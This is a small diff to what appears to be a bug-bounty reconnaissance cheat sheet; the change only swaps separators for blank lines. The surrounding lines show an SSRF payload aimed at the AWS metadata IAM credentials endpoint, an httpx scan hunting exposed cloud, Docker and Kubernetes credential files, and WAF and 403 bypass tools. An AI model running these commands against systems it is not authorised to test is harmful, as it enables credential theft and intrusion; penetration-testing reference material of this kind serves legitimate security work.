@@ -1637,7 +1637,7 @@ cat urls.txt | gf ssrf | qsreplace "http://169.254.169.254/latest/meta-data/iam/
 ```bash
 cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig -mc 200 | anew cloud_creds.txt
 ```
----
+
 
 ## Waf Evasion
 - Advanced tool for security researchers to bypass 403/40X restrictions :
@@ -1649,11 +1649,12 @@ go install github.com/devploit/nomore403@latest
 ```bash
 ./nomore403 -u https://domain.com/admin
 ```
+
 # bypass WAF Limitations use plugin nowafpls in burp sutie :
 ```
 https://github.com/assetnote/nowafpls
 ```
----
+
 
 ## 🤖 Automation Scripts
 
